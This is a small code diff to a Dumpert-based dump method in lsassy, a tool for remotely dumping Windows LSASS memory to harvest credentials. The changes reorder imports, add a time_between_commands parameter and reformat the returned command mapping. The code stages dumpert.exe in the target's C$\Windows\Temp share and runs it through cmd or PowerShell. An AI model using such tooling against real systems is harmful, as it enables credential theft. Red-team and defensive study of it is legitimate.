@@ -2,7 +2,7 @@
 https://github.com/outflanknl/Dumpert
 """
 
-from lsassy.dumpmethod import IDumpMethod, Dependency
+from lsassy.dumpmethod import Dependency, IDumpMethod
 
 
 class DumpMethod(IDumpMethod):
@@ -13,8 +13,8 @@ class DumpMethod(IDumpMethod):
     dump_share = "C$"
     dump_path = "\\Windows\\Temp\\"
 
-    def __init__(self, session, timeout):
-        super().__init__(session, timeout)
+    def __init__(self, session, timeout, time_between_commands):
+        super().__init__(session, timeout, time_between_commands)
         self.dumpert = Dependency("dumpert", "dumpert.exe")
 
     def prepare(self, options):
@@ -25,7 +25,4 @@ class DumpMethod(IDumpMethod):
 
     def get_commands(self):
         cmd_command = """{}""".format(self.dumpert.get_remote_path())
-        return {
-            "cmd": cmd_command,
-            "pwsh": cmd_command
-        }
+        return {"cmd": cmd_command, "pwsh": cmd_command}
